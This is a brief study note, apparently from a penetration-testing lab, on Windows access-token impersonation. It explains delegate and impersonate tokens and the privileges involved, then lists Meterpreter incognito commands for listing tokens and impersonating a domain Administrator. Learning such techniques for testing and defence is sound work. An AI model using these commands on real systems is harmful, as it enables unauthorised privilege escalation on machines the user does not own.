# Token Impersonation using Incognito

- Windows access tokens are core element of authentication process which is created and managed by Local Security authority subsystem (LSASS)
- When we login to the system `winlogon.exe` generates an access token and attaches it with each `userinit.exe` process which is responsible for creating the child process after we login.

There are two types of tokens:
1. **DELEGATE Tokens :** are created when users interactively login into a system using their credentials, physically or remotely via RDP.
2. **IMPERSONATE Tokens** : created when users non-interactively login into a system, like accessing a shared drive on the network.

#### PRIVILGES TO HAVE FOR A SUCCESSEFUL ATTACK:
1. `SeAssignPrimaryToken` : this allows to impersonate tokens
2. `SeCreateToken` : allows user to create a new token with Admin privileges.
3. `SeImpersonatePrivilege` : allows a normal user to create a process with security controls of an admin users.

#### PRIVILEGE ESCALATION:

1. Gain an initial Meterpreter shell
2. Load the incognito module
```
load incognito
```
3. Now list all available tokens on the target 
```
list_tokens -u
```
4. Now impersonate the Administrator token
```
impersonate_token ATTACKDEFENSE\\Administrator
```
